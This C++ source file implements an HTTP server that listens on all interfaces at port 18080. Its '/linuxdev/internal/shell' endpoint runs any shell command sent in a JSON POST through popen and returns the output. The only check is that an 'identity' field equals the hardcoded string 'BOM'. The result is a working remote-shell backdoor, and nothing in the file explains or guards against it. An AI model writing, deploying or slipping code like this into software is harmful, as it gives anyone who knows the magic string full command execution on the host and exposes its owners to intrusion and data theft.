#include <iostream>
#include <string>
#include <cstdlib>
#include <future>
#include <chrono>
#include <memory>
#include "httplib.h"
#include "json/json.h"

std::string execute_command(const std::string& cmd) {
    std::string data;
    std::array<char, 128> buffer;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
    if (!pipe) {
        return "Failed to run command";
    }

    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        data += buffer.data();
    }
    return data;
}

void handle_shell(const httplib::Request& req, httplib::Response& res) {
    if (req.method == "POST") {
        Json::Value root;
        Json::Reader reader;
        bool parsingSuccessful = reader.parse(req.body, root);
        if (parsingSuccessful) {

            std::string command = root["command"].asString();
            std::string identity = root["identity"].asString();

            if(identity == "BOM"){
                // Execute command without timeout
                std::string result = execute_command(command);
                res.set_content(result, "text/plain");
            }else{
                res.set_content("Authentication failed", "text/plain");
            }

        } else {
            res.set_content("Failed to parse JSON", "text/plain");
            std::cout << "Failed to parse JSON" << std::endl;
            res.status = 400;
        }
    } else {
        res.status = 405;
    }
}

int main() {
    httplib::Server svr;

    svr.Post("/linuxdev/internal/shell", handle_shell);

    svr.listen("0.0.0.0", 18080); // Listen on all interfaces for demonstration purposes

    return 0;
}
